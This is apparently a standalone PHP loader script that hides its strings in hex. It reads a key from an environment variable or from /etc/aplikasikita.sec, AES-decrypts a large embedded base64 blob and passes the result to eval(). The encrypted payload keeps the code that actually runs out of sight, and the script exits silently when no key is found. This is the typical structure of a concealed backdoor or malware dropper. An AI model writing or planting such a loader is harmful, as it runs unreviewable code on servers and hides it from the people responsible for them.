<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('jH6fOrOrqZ8eet1it6HwkQ==');

$c=base64_decode(

'MNZaxr45QG6it17fGUAdcgTubrc2XSX1Y0I/QYVfBhIAuwfO3GIwq/eDkOlff3kYKFPA2ZY5a1UO' .
'mogDvAUm8fzcrpD5X37vdLJoAJIChyEXmPrFs3qGLiP5ldt/VebfWuH+Z4aHpD4Ftfyhee9fgibw' .
'jFRmCnrOVMrqCyePp+diwSMNZXC3X4buGWRB5es+NXe9HBjB5O1/1knS47PbORZQwhmk7R8T+43l' .
's0oiVbpCv0xMq7F8NFYIXvOBBR1HbmnEVIgdY+qygW+8SlYO9/9GaSHLw/X4QpefwDbIyb8zin8H' .
'AT0r/Lwsixxg60C9xJw5Mq8p0pzWYf7W69SY26M+upC3OM/XtqR76JaWHTzOC+l4aFBLEC/WdwHb' .
'b2ZYbm6lZ+AQpIck/dVd/3a+9G6R4AxY7snhU45jdMzyDo5D2qX0tuIbShINCiGUVy8wQQai67yd' .
'PDdZde+1HebHOX3C8flifjkXfNlxO72zI6jStDVHIEwH0DzCzV7RCWHOgixiZfS//efTZL3vmhNM' .
'kvWqhEf/vP+YNwbp86+W3bSr+PDYxh4AxlmR1V+1da2J9kPJS+Ew8poKAr2QqFUP+zJgpUnRZl5x' .
'9Um1aiHGD8XWz0qql1SmGRRMtLJ+HeDNHpHnA0gVY21SUg38SYMz3neGO3aMOorAT7r6uQIBc098' .
'gnl+CZHltRadfLd/xOQS/2TFDvjqQ26/xDulzlJ1Mou4proDeym/bv5e9IsUHgC/16ur39U0T4+L' .
'vfePfEloM8wH5tIfcIcGFFdBJ/m5gS1cXiuqskUtV3DNkhdgV1iD/MKt331DCCadCIt9fK3TdCie' .
'rjImzYsCtB2f1l2h6ylSKnWr/eMc3CLGDjRCT/PvwNU9742I7c/DNa6jHzYEvaej/f6iVG0aIyju' .
'IWo3YT1PyImsnSHbaTJ6OSoBtCcgnS/AWQEDAzrEnbE2yNY+3uTCqdnAhcbs0BsJAmK1sH16Eayu' .
'y5/n1r+TTi3RzWuOniaOdkchJme0Qe0a8bddfHTC7bibhHOdTcfdkjRAS9YdAMGtlLZC8YjJfIwp' .
'YqLgBTT2fPVdhGQWUFdUDLdsyZvqgF1XsHuAK/dGnlAhKKC2YP5XOTZd0mXOsnzQNfvKWhVyL7ab' .
'9wljmoJiTgZASAsHlYNn4XkmsZwgknRKWY9B7tUUQg3Y0KvnSGff6SjfkaczPPUJn1pLu2qCjbGs' .
'lx+cTX3SqeyxzFGh79rHSyDSlmgUnotmIcffRFaqL9M7U+mbocEjZslxcZ5TmhDXUiLd/e2n+DVN' .
'koNJmbIhw2GWhMrXSGb4bDS4KaSE+SQ6NSvqPz0P94EmmRyYmeY2AI2IdhGCmiKd/DUJoGke5g=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

